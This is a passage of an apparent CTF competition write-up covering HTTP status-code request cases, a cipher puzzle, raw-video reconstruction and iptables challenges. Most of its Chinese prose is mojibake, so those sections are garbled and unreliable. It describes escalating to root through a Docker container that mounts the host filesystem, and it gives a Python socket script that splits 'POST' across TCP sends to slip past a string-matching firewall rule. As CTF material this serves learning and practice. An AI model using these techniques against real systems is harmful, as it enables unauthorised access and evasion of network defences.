ource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/very/long/resource/path/that/exceeds/the/allowed/limit/and/so/on/for/a/very/long/time?query=parameter&name=value&with=some&very=long&query=parameters&that=exceeds=the=allowed=limit&and=so=on&for=a=very=long=time  HTTP/1.1\r\n
Host: localhost\r\n
\r\n
```

413 

```
POST /upload HTTP/1.1\r\n
Host: localhost\r\n
Content-Length: 10000000\r\n\r\n
```

206

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=100-200\r\n
\r\n
```

200

```
GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
```

505

```
GET / HTTP/2\r\n
Host: localhost\r\n
```

404

```
GET /qqq HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

416

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1000-500\r\n
\r\n
```

412

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
If-Unmodified-Since: Wed, 21 Oct 2015 07:28:00 GMT\r\n
\r\n
```

405

POST / PUT éƒ½æ˜¯è¿™ä¸ªè¡Œä¸º

```
PUT / HTTP/1.1\r\n
Host: example.com\r\n
```

400

```
GET HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

no status??ä»ä»£ç çœ‹æ˜¯å°‘å†™æœ€åçš„ `\r\n`

æˆ‘ä¹Ÿè®°ä¸å¾—äº†ï¼Œä½†é‚£ä¸ªä»£ç å¤§æ¦‚æ˜¯è¿™æ ·çš„

```
GET / \r\n

```



---

## Docker for Everyone

éšä¾¿æ‰¾äº†æ‰¾ flag åœ¨å“ªé‡Œï¼Œçœ‹äº†ä¸‹æƒé™ï¼Œåªæœ‰ root èƒ½è¯»ã€‚

ä½ è¿™é‡Œä¸Šä¸å»æƒé™ï¼Œä½†æ˜¯ docker èƒ½ä¸Šæƒé™å•Šï¼Œèƒ½å¼€å‡º alpine å®¹å™¨ï¼Œé‚£é‡Œé¢æ˜¯ root å•Šï¼Œä¸å°±ç­‰äºä¸€ä¸ª sudo äº†ï¼ˆï¼ˆ

ç„¶åæŠŠæœ¬åœ°çš„æ–‡ä»¶å¤¹ mount è¿›å»ï¼Œä¸å°±éšä¾¿è¯»äº†ï¼Œç¬‘æ­»ï¼ˆ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/12-1.png)



---

## æ¨¡ä»¿æ¸¸æˆ å›¾çµå†ä¸–ï¼ˆæƒœå­—å¦‚é‡‘ 2.0ï¼‰

æœ¬æ¥å·®ç‚¹æ”¾å¼ƒäº†ï¼Œä½†æ˜¯ä»”ç»†çœ‹äº†ä¸€éä»£ç ä»¥åå‘ç° `flag{` å’Œ `}` æ˜¯å›ºå®šçš„ã€‚

æˆ‘ä¸ç”±å¾—æƒ³èµ· *The Imitation Game* å½“ä¸­ï¼Œç ´è¯‘ Enigma çš„çµå…‰ä¸€é—ªï¼šå¾·å›½äººæ¯å¤©æ—©ä¸Šçš„å¹¿æ’­çš„ç»“å°¾æ˜¯ä¸€æ ·çš„ã€‚

ä»£ç é‡Œé¢æœ‰è¿™æ ·ä¸€è¡Œï¼š

```python
check_equals(set(len(s) for s in cod_dict), {24})
```

å†³å®šäº†æ¯è¡Œå¿…åŠ ä¸€ä¸ªå­—æ¯ã€‚

å¯¹äºæ¯ä¸€è¡Œï¼Œè¿™æ ·åŠ å®Œä»¥åï¼Œé¦–å°¾çš„ offset åº”è¯¥ä¸å¦‚ä¸‹å€¼å®Œå…¨ä¸€è‡´ï¼š

```
00    23
24    47
48    71
72    95
96    119
```

æˆ‘ä»¬å°±å…ˆä¸åŠ ä¸Šé‚£ä¸€ä¸ªå­—æ¯ï¼Œä½†æ˜¯æŒ‰ç…§æ–°çš„ offset å»ç®—ã€‚

å°±è¿‘é€‰å­—æ¯ï¼Œä»¥æ¯è¡Œå¼€å¤´å‚ç…§ï¼Œç®—å‡ºæ–°çš„ offset. 

```
f 52     L3
l 41     L2
a 84/85  L4
g 108    L5
{ 74     L4
} 28     L2
```

è€Œåœ¨è¾“å‡º flag ä»£ç é‡Œçš„é¢„æœŸå€¼æ˜¯ï¼š

```
f 53
l 41
a 85
g 109
{ 75
} 28
```

å°±çŸ¥é“å¦‚æœå°‘äºé¢„æœŸå€¼å°±åœ¨è¿™ä¸ªå­—ç¬¦å‰é¢è¡¥ï¼Œå¦åˆ™åœ¨åé¢è¡¥

å®é™…æ“ä½œçš„æ—¶å€™èµŒäº†ä¸€æŠŠï¼Œå…¨éƒ¨åœ¨æœ€å‰é¢å’Œæœ€åé¢åŠ ã€‚

ç¬¬ä¸€è¡Œæ²¡æœ‰æ¶‰åŠä¸Šé¢çš„å­—ç¬¦ï¼Œå¤§èƒ†åœ°åŠ åœ¨äº†æœ€åã€‚

å®Œæ•´ä»£ç 

```diff
#!/usr/bin/python3

# Th siz of th fil may reduc after XZRJification

def check_equals(left, right):
    # check whether left == right or not
    if left != right: exit(1)

def get_cod_dict():
    # prepar th cod dict
    cod_dict = []
-    cod_dict += ['nymeh1niwemflcir}echaet']
+    cod_dict += ['nymeh1niwemflcir}echaetA']
-    cod_dict += ['a3g7}kidgojernoetlsup?h']
+    cod_dict += ['a3g7}kidgojernoetlsup?hB']
-     cod_dict += ['ulw!f5soadrhwnrsnstnoeq']
+    cod_dict += ['Culw!f5soadrhwnrsnstnoeq']
-     cod_dict += ['ct{l-findiehaai{oveatas']
+    cod_dict += ['Dct{l-findiehaai{oveatas']
-     cod_dict += ['ty9kxborszstguyd?!blm-p']
+    cod_dict += ['Ety9kxborszstguyd?!blm-p']
    check_equals(set(len(s) for s in cod_dict), {24})
    return ''.join(cod_dict)

def decrypt_data(input_codes):
    # retriev th decrypted data
    cod_dict = get_cod_dict()
    output_chars = [cod_dict[c] for c in input_codes]
    return ''.join(output_chars)

if __name__ == '__main__':
    # check som obvious things
    # check_equals('creat', 'cr' + 'at')
    # check_equals('referer', 'refer' + 'rer')
    # check th flag
    flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
                         17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
                         31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
                         25, 63, 77, 36, 5, 32, 60, 67, 113, 28])
    check_equals(flag.index('flag{'), 0)
    check_equals(flag.index('}'), len(flag) - 1)
    # print th flag
    print(flag)

```

æœ€åå‘ç°æœ‰ä¸€ä¸ªå­—æ¯å˜æˆäº†å¤§å†™çš„ Cï¼Œé‚£å°±æ˜¯ç¬¬ä¸‰è¡Œå¼€å¤´çš„ã€‚

flag çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªè‹±æ–‡å¥å­ï¼Œå¤§èƒ†çŒœæµ‹æ˜¯æœ¬æ¥åº”è¯¥æ˜¯å°å†™ uï¼Œè¿˜åŸæƒœå­—å¦‚é‡‘åº”è¯¥è¡¥åœ¨åé¢ï¼ˆ`uClw!`ï¼‰

è’™å¯¹ã€‚



---

## ç»ˆç«¯å­—ç¬¦ç”»ç”µå½±é™¢ï¼ˆé«˜é¢‘ç‡æ˜Ÿçƒï¼‰

```bash
asciinema cat asciinema_restore.rec > output.js
```

æå¤´å»å°¾ï¼Œç•™ä¸‹ä¸­é—´çš„ js

æ¥ç€åœ¨ VSCode é‡Œé¢æŠŠæŠ¥é”™çš„åœ°æ–¹åˆ æ‰å°±è¡Œ

ä¸€å¼€å§‹æ˜¯æˆ‘æƒ³å¤æ‚äº†ï¼ˆè§æ³¨é‡Šï¼‰

<!--ç„¶åæŒ‰é¡ºåºæ“ä½œã€‚æœªå†™å‡ºå…·ä½“æ›¿æ¢çš„åˆ™æ˜¯åˆ é™¤-->

<!--regexp: \[\d+\.\d+, "o", "-->
<!--\u001b[K"]-->
<!-- \r\n: -->
<!--\u001b[K~\b~\r-->
<!--\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[\u001b[K6\b6-->

<!--\",\r\n  å˜æˆ ",çœŸçš„æ¢è¡Œ-->
<!--,\r\n  ,å˜æˆçœŸçš„æ¢è¡Œ-->

<!--\" -> " -->

<!--\u001b[K~\b~\r\u001b[K--> 

<!--"]å¸¦æ¢è¡Œ åˆ æ‰-->

<!--\r\u001b[K \u001b[KESC\b\b\bESC\u001b[K[\b[\u001b[K6\b6 çœŸçš„æ¢è¡Œ-->

<!--ç²¾ä¿® h"] å’Œ \r-->



---

## ä¸ºä»€ä¹ˆï¼ï¼ˆæµå¼æ˜Ÿçƒï¼‰

è¯»äº†å°åŠå¤©ä»£ç å¤§æ¦‚çœ‹å‡ºæ¥æ˜¯æŠŠæ¯ä¸€å¸§éƒ½è¯»å‡ºæ¥ï¼Œç„¶åé¡ºåºè¾“å‡ºæˆäºŒè¿›åˆ¶ã€‚

æˆ‘è‡ªå·±çš„ç†è§£æ˜¯è¿™æ ·çš„

```
buffer[frame][height][width][color_channel]

buffer[frame*height*width][color_channel]

buffer[frame*height*width*color_channel]
```

é‚£è¦åšçš„å°±æ˜¯è¿›è¡Œä¸€ä¸ªåå˜æ¢ï¼Œä½†æ˜¯åè¿‡æ¥å°±æ˜¯å› æ•°åˆ†è§£ï¼Œè‚¯å®šæ›´éš¾ã€‚è€Œä¸”ç”Ÿæˆæµçš„ä»£ç ä¼šåœ¨æœ€åéšæœºåˆ é™¤ 0-100 ä¸ªå­—èŠ‚ï¼Œä½¿å¾—é€šè¿‡å­—èŠ‚æ•°çŒœæµ‹åˆ†è¾¨ç‡å’Œå¸§æ•°å‡ ä¹ä¸å¯èƒ½ï¼Œåªèƒ½çŒœã€‚å†…å®¹åªæœ‰è§†é¢‘æµæ‰€ä»¥ä¸è€ƒè™‘å…¶ä»–ï¼Œæ— è„‘ç›¸ä¹˜å°±è¡Œã€‚

```python
import cv2
import numpy as np

def convert_binary_to_mp4(input_file, output_file, frame_width, frame_height, frame_count):
    # Read the binary data from the file
    buffer = np.fromfile(input_file, dtype=np.uint8)
    
    # Reshape the data to the original shape
    buffer = buffer.reshape((frame_count, frame_height, frame_width, 3))
    
    # Create a VideoWriter object to save the frames as an MP4 video
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Codec for MP4 format
    out = cv2.VideoWriter(output_file, fourcc, 30, (frame_width, frame_height))
    
    # Write each frame to the video file
    for frame in buffer:
        out.write(frame)
    
    # Release the VideoWriter
    out.release()

if __name__ == "__main__":
    input_file = "xaa"
    output_file = "output_video.mp4"
    frame_width =  427    # Enter the frame width used in your original code
    frame_height = 759  # Enter the frame height used in your original code
    frame_count =  138   # Enter the frame count used in your original code

    convert_binary_to_mp4(input_file, output_file, frame_width, frame_height, frame_count)

```

ä¸€å¼€å§‹ä¸å¤ªç¡®ä¿¡è¿™ä¸ªä»£ç èƒ½ç”¨ï¼Œè¿˜è‡ªå·±ç”¨äº† kazam å½•äº†ä¸€ä¸ªå¾ˆå°çš„å±ï¼Œå†ç”¨é¢˜ç›®ç»™çš„ä»£ç è½¬æˆæµï¼Œå†è½¬æ¢å›æ¥ã€‚è™½ç„¶ç”»è´¨ç¨æœ‰ä¸‹é™ï¼Œä½†åº”è¯¥æ¢å¤äº†äº†å…«æˆã€‚

å½“ç„¶äº†ï¼Œè¿™é‡Œçš„å¸§æ•°å’Œå®½é«˜æ˜¯è¦è‡ªå·±æŒ‡å®šçš„ã€‚

è¿™ä¸ªä»£ç æœ‰ä¸ªä¸å¥½å°±æ˜¯ï¼šæ¯æ¬¡éƒ½è¦æå‰ç®—å¥½å¸§æ•°å’Œå¯¹åº”çš„æ¯”ç‰¹æµå¤§å°ï¼Œç„¶åç”¨ `split` æŠŠé¢˜ç›®ç»™çš„ bin åˆ‡æˆè¿™ä¸ªå¤§å°ï¼ˆæ‰€ä»¥ä½ æ‰ä¼šçœ‹åˆ° xaa è¿™ä¸ªæ–‡ä»¶åã€‚å°±è¿™éƒ½æ¯”æˆ‘ä¸€å¼€å§‹å‚»ä¸æ‹‰å½ç”¨ `dd bs=1` å¥½å¤šäº†ï¼‰

æ‹¿å‡ ä¸ªå¸¸è§çš„åˆ†è¾¨ç‡äº†ä¸€ä¸‹ï¼Œåªæœ‰ 640*480 çš„å‹‰å¼ºèƒ½çœ‹ï¼Œç„¶åå¤§æ¦‚çŸ¥é“ flag åœ¨è§†é¢‘ååŠæ®µã€‚

è¿™ä¸ªç”»é¢å®åœ¨æ˜¯å¤ªæ¨¡æ‹Ÿç”µè§†äº†ï¼Œæ¢¦å›ä¸–çºªä¹‹äº¤

*P.S. æˆ‘éå¸¸åœ¨æ„ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™æ ·çš„å›¾åƒï¼Œä»¥å‰æ˜¯çœŸçš„å› ä¸ºåˆ†è¾¨ç‡ä¸è¶³ï¼Œé‚£è¿™åˆæ˜¯**ä¸ºä»€ä¹ˆ**ï¼Ÿ*

*P.P.S. å¥½äº†ï¼Œçœ‹å®Œç¥å¸çš„ wp ä»¥åå°±æ‡‚äº†ã€‚åŒä¸€è¡Œä¸Šä¸¤ä¸ªé‡å¤å†…å®¹çš„è·ç¦»å°±æ˜¯æœ¬æ¥çš„å®½åº¦ã€‚*

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/16-1.png)

åˆ—è¡¨ï¼Œè®¡ç®—æ‰€éœ€çš„ bit stream å¤§å°

csv æ ¼å¼ï¼š

width, height, sizeof(frame), sizeof(video.bin)/sizeof(frame), floor(frames), sizeof(frame)*floor(frames)

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/16-2.png)

**åˆ†è¾¨ç‡å¤§äº†é‡å½±æ›´å¤šï¼Œé‚£å®½åº¦åº”è¯¥æ›´å°ï¼Œä½†æ˜¯å¦‚æœå¤ªå°äº†ä¹Ÿæ˜¯å¯¹ä¸å‡†ï¼Œé‚£ä¼°è®¡å’Œ 640*480 å·®ä¸åˆ°å“ªé‡Œå»ã€‚**

é‚£å°±å†è¯•è¯•ï¼Œç»“æœæ— ä¸€ä¾‹å¤–è¿˜æ˜¯ä¸è¡Œ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/16-3.png)

åé¢çœ‹äº†ç”Ÿæˆä»£ç åˆ†è¾¨ç‡ä¸èƒ½ä»¥ 0 ç»“å°¾ï¼Œ

```python
    assert frame_width % 10 != 0
    assert frame_height % 10 != 0
```

æ„è¯†åˆ°ä¸åº”è¯¥ççŒœå¸¸è§åˆ†è¾¨ç‡ï¼Œæ¯æ¬¡æŠ æ‰ bin çš„ç»“å°¾æ¥ make numpy happyï¼Œå†è¿˜åŸä¸€æ•´ä¸ªè§†é¢‘ï¼›è€Œåº”è¯¥å…ˆå¯¹æ¯ä¸ªå¯èƒ½çš„åˆ†è¾¨ç‡é‡‡ä¸€ç‚¹æ ·ï¼Œç„¶åä¸€ä¸ªä¸ªè¯†åˆ«ï¼Œäºæ˜¯å¼€å§‹ç³Šé‡‡æ ·ä»£ç ã€‚

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/16-5.png)

ä¸ä¼šæ¥å…¥ OCR çœŸçš„ç—›è‹¦ï¼Œå¾—è‡ªå·±ä¸€å¼ å¼ å»çœ‹ã€‚ç„¶åç¡¬æ˜¯æ‰¾åˆ°è¿™å¼ èƒ½çœ‹çš„ï¼Œä½†æ˜¯é‡å½±é‡Œè¿˜èƒ½çœ‹åˆ°å­—å¹•ï¼Œé‚£çœ‹æ¥é«˜åº¦ä¸å¤Ÿ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/16-6.png)

è·‘å®Œå®½åº¦è·‘é«˜åº¦ï¼Œä¸è¿‡é«˜åº¦è¿˜å¥½ï¼Œå°±ç®—ç¨æœ‰åå·®ï¼Œç”»é¢çš„åç§»ä¹Ÿä¸å¤§

```diff
import cv2
import numpy as np

if __name__ == "__main__":
    input_file = "video.bin"  # Assuming you have the binary data already loaded

    # Load the binary data into the buffer (you should have the buffer already)
    buffer = np.fromfile(input_file, dtype=np.uint8)

    # Define the range for frame_width and frame_height
-    for frame_width in range(100, 640, 1):
+    for frame_width in range(427, 428, 1):
-        for frame_height in range(432, 433, 1):
+        for frame_height in range(600, 800, 1):
            # Calculate the size of one frame
            frame_size = frame_width * frame_height * 3  # 3 color channels (assuming no compression)
            # Extract the data of the 1st frame
            first_frame_data = buffer[:frame_size].reshape((frame_height, frame_width, 3))
            # Save the 1st frame as an image
            filename = f"{frame_width}_{frame_height}.png"  # Output image file
            cv2.imwrite(filename, first_frame_data)

```

é€å¼ è¾¨è¯†ï¼Œç›´åˆ°å­—å¹•ä½ç½®åˆé€‚

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/16-7.png)

ç„¶åè®¡ç®—å¸§æ•°å’Œå¤§å°

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/16-8.png)

æˆåŠŸäº†ï¼ˆ

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/16-9.png)

~~è¿™ä¸å°±æ‰‹æœºçŸ­è§†é¢‘åˆ†è¾¨ç‡ï¼Œæ˜¯æˆ‘è½ä¼äº†~~

~~æœ€åæ›´æ˜¯æ„è¯†åˆ°åº”è¯¥å»æ‰¾é‚£ä¸ªBç«™å¸å· MyGO_Officialï¼ˆï¼ˆï¼ˆ~~

è¿˜æœ‰æˆ‘æ€ä¹ˆçœ‹åˆ°é¢˜è§£å„ä½åšå‡ºæ¥ bangdream çš„å­—éƒ½æ˜¯é»„è‰²çš„ï¼Œå°±æˆ‘è°ƒå‡ºæ¥æ˜¯è“è‰²å—ï¼Œé—®äº†ç¾¤å‹è¯´æ˜¯ OpenCV é¢œè‰²é€šé“é¡ºåºåäº†ï¼Œå¼„æˆ BGR äº†ï¼Œä½†æˆ‘çœŸçš„æ²¡æ„Ÿè§‰åˆ°å•Š...

ä¹Ÿå°±åªæœ‰åšåš misc çš„ä»½äº†ï¼Œåé¢çš„è®¡ç®—å™¨é‚£é¢˜æ ¹æœ¬åšä¸å‡ºæ¥ã€‚å”‰ï¼Œç¾¡æ…• MyGOï¼Œè¿™éƒ¨ç•ªæˆ‘éƒ½è¿˜æ²¡çœ‹



---

## ä½å¸¦å®½æ˜Ÿçƒ

éšä¾¿æ‰¾ä¸ªåœ¨çº¿å·¥å…·å‹ç¼©ä¸€ä¸‹ï¼Œæå®š 2KB

ç¬¬äºŒé—®å°±çŸ¥é“æ˜¯ä¸‰ä¸ªå¤§è‰²å—ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆå‹ï¼Œæ‘†çƒ‚



---

## Batter my heart, three-personed God (Komm, sÃ¼sser Flagge)

<!--æœ¬æ¥å°±å¯¹æœ¬é¢˜æä»–çš„é‚£ä½å¾ˆèƒ½å…±æƒ…ï¼Œåšè¿™é¢˜çš„æ—¶å€™æ„Ÿè§‰æ›´èƒ½ç†è§£å¥¹äº†ã€‚-->

**ä»æ²¡è§‰å¾— TCP æœ‰æ„æ€è¿‡**

```
-A myTCP-1 -p tcp -m string --algo bm --string "POST" -j REJECT --reject-with tcp-reset
```

è¿‡æ»¤å­—ç¬¦ä¸² POST çš„

æƒ³äº†ä¸‹ payload åº”è¯¥å¯ä»¥åˆ‡å¼€çš„ï¼Œé‚£è¦ä¹ˆè¯•è¯•ï¼Ÿ

```python
import socket
import time

target_ip = "202.38.93.111"
target_port = 18082
token = "YOUR_TOKEN"

# establish TCP conn
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# "PO"
s.send(b"PO")
time.sleep(0.1)  

# "ST / HTTP/1.1"
request = "ST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n\r\n{}".format(target_ip, len(token), token)
s.send(request.encode())
# get response
response = s.recv(4096)
print(response.decode())

# close conn
s.close()

```

===

**é‚£æ ·å°±å’Œå•çº¯çš„å¤åˆ¶æ²¡ä»€ä¹ˆåŒºåˆ«äº†**

```
-A myTCP-2 -p tcp -m u32 --u32 "0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50" -j REJECT --reject-with tcp-reset
```

é—® GPTï¼ŒGPT è¯´ TCP Payload çš„ç¬¬ä¸€ä¸ªå­—ä¸èƒ½æ˜¯ `\x50` ä¹Ÿå°±æ˜¯ Pã€‚

æˆ‘ä¸€å¼€å§‹å‚»ä¸æ‹‰å½çœ‹åäº†ï¼Œç„¶åç›´æ¥æŠŠç¬¬ä¸€é—®æ”¹äº†ç«¯å£å‘å‡ºå»äº†

ç»“æœæ‹¿åˆ°äº†å°±æ²¡å¤šæƒ³ï¼Œç°åœ¨ä¸€çœ‹æ˜¯éé¢„æœŸï¼ˆ

===

**ä¸ºä»€ä¹ˆ Layer 3 çš„ä¸œè¥¿éƒ½æ˜¯åˆéš¾åˆå†·é—¨çš„**

```
-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
```

ä¸€å¼€å§‹æƒ³ç€æ˜¯ä¸æ˜¯ TCP payload çš„å‰äº”åä¸ªå­—ï¼Œä¸è¡Œï¼Œå‘ SYN çš„æ—¶å€™å°±ç»™é‡ç½®äº†

ä¸€æŸ¥ï¼Œç»“æœå¥½å®¶ä¼™ï¼Œç»™æˆ‘çœ‹åˆ°[è¿™ä¸ª](https://serverfault.com/a/1000470)ï¼š

> The `--to` option gives you the **maximal** offset at which your string can start. The offset is relative to the start of the IP packet. If you add up:
>
> - **20** bytes for the IP header,
> - **20** bytes for the TCP header,
> - **12** bytes for some TCP options
>
> you'll end up with 52 bytes. So the start of the TCP payload is at  offset 52, anything less than that will match just the TCP/IP headers.
>
> Remark that the TCP options do not have a fixed length. The number 12 was obtained experimentally through **tcpdump**, but every system can send a different number of options.

iptables æ˜¯ä» IP å¤´å¼€å§‹ç­›ï¼Œå‰é¢å·²ç» 20+20=40 byte äº†ï¼Œå†å¸¦ä¸ªæ—¶é—´æˆ³å°±æ˜¯ 52 å­—èŠ‚äº† 

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/18-3.png)

![](https://raw.githubusercontent.com/h3arn/hg2023-wp/master/img/18-2.png)

